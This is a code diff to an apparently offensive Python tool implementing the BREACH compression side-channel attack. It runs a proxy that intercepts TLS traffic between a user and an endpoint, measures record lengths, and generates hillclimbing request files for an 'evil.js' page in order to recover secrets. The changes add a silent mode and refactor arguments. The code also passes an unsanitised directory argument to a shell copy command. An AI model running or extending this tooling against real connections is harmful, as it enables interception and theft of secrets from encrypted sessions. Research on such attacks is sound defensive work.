@@ -98,17 +98,20 @@ def parse(data, past_bytes_endpoint, past_bytes_user, chunked_endpoint_header, c
 
     if is_response:
             if cont_type in constants.TLS_CONTENT:
-                    print("Endpoint %s Length: %d" % (constants.TLS_CONTENT[cont_type], length))
+                    if not args_dict['silent']:
+                        print("Endpoint %s Length: %d" % (constants.TLS_CONTENT[cont_type], length))
                     if cont_type == 23:
                             with open('out.out', 'a') as f:
                                 f.write("Endpoint application payload: %d\n" % length)
                                 f.close()
             else:
-                    print("Unassigned Content Type record (len = %d)" % len(data))
+                    if not args_dict['silent']:
+                        print("Unassigned Content Type record (len = %d)" % len(data))
             lg.append("Source : Endpoint")
     else:
             if cont_type in constants.TLS_CONTENT:
-                    print("User %s Length: %d" % (constants.TLS_CONTENT[cont_type], length))
+                    if not args_dict['silent']:
+                        print("User %s Length: %d" % (constants.TLS_CONTENT[cont_type], length))
                     if cont_type == 22:
                             if ord(data[constants.MAX_TLS_POSITION]) > constants.MAX_TLS_ALLOWED:
                                 downgrade = True
@@ -117,7 +120,8 @@ def parse(data, past_bytes_endpoint, past_bytes_user, chunked_endpoint_header, c
                                 f.write("User application payload: %d\n" % length)
                                 f.close()
             else:
-                    print("Unassigned Content Type record (len = %d)" % len(data))
+                    if not args_dict['silent']:
+                        print("Unassigned Content Type record (len = %d)" % len(data))
             lg.append("Source : User")
 
     try:
@@ -184,6 +188,14 @@ def restart():
 
     logger.info("Proxy has restarted")
 
+def stop():
+    '''
+    Shutdown sockets and terminate connection.
+    '''
+    user_connection.close()
+    endpoint_socket.close()
+    logger.info("Connection closed")
+
 def user_setup():
     '''
     Create and configure user side socket.
@@ -217,7 +229,7 @@ def execute_breach():
     '''
     Start proxy and execute main loop
     '''
-    # Initialize counters for defragmentation
+    # Initialize parameters for execution.
     past_bytes_user = 0 # Number of bytes expanding to future user packets
     past_bytes_endpoint = 0 # Number of bytes expanding to future endpoint packets
     chunked_user_header = None # TLS user header portion that gets stuck between packets
@@ -247,7 +259,8 @@ def execute_breach():
                         logger.info("User connection closed")
                         restart()
                 else:
-                        print("User Packet Length: %d" % len(data))
+                        if not args_dict['silent']:
+                            print("User Packet Length: %d" % len(data))
                         output, past_bytes_endpoint, past_bytes_user, chunked_endpoint_header, chunked_user_header, downgrade = parse(
                                                                                                                                      data,
                                                                                                                                      past_bytes_endpoint,
@@ -288,7 +301,8 @@ def execute_breach():
                         logger.info("Endpoint connection closed")
                         restart()
                 else:
-                        print("Endpoint Packet Length: %d" % len(data))
+                        if not args_dict['silent']:
+                            print("Endpoint Packet Length: %d" % len(data))
                         output, past_bytes_endpoint, past_bytes_user, chunked_endpoint_header, chunked_user_header, _ = parse(
                                                                                                                               data,
                                                                                                                               past_bytes_endpoint,
@@ -305,33 +319,33 @@ def execute_breach():
                             logger.error(exc)
                             restart()
 
-    # Close sockets to terminate connection
-    user_connection.close()
-    endpoint_socket.close()
-    logger.info("Connection closed")
-
 def parse_args():
     '''
     Parse console arguments for standalone use.
     '''
+    global args_dict
+
     parser = argparse.ArgumentParser(description='Create hillclimbing parameters file')
-    parser.add_argument('-a', metavar = 'alphabet', required = True, nargs = '+', help = 'Choose alphabet type (careful to use correct request order): n => digits, l => lowercase letters, u => uppercase letters, d => - and _')
+    parser.add_argument('--silent', action = 'store_true', help = 'Enable silent execution.')
+    parser.add_argument('-a', '--alpha_types', metavar = 'alphabet', required = True, nargs = '+', help = 'Choose alphabet type: n => digits, l => lowercase letters, u => uppercase letters, d => - and _')
     parser.add_argument('-p', '--prefix', metavar = 'bootstrap_prefix', required = True, help = 'Input the already known prefix needed for bootstrap')
     parser.add_argument('-m', '--method', metavar = 'request_method', help = 'Choose the request method: s => serial, p => parallel')
     parser.add_argument('--wdir', metavar = 'web_application_directory', help = 'The directory where you have added evil.js')
     args = parser.parse_args()
-    alpha_types = args.a
-    prefix = args.prefix
-    method = args.method if args.method else 's'
-    wdir = args.wdir if args.wdir else '/var/www/breach'
-    return alpha_types, prefix, method, wdir
+
+    args_dict = {}
+    args_dict['silent'] = True if args.silent else False
+    args_dict['alpha_types'] = args.alpha_types
+    args_dict['prefix'] = args.prefix
+    args_dict['method'] = args.method if args.method else 's'
+    args_dict['wdir'] = args.wdir if args.wdir else '/var/www/breach'
 
 if __name__ == "__main__":
     import argparse
 
     initialize()
-    alpha_types, prefix, method, wdir = parse_args()
-    hillclimbing.create_request_file(alpha_types, prefix, method)
-    system("cp request.txt " + wdir)
+    parse_args()
+    hillclimbing.create_request_file(args_dict)
+    system("cp request.txt " + args_dict['wdir'])
     logger.info("Hillclimbing parameters file created")
     execute_breach()
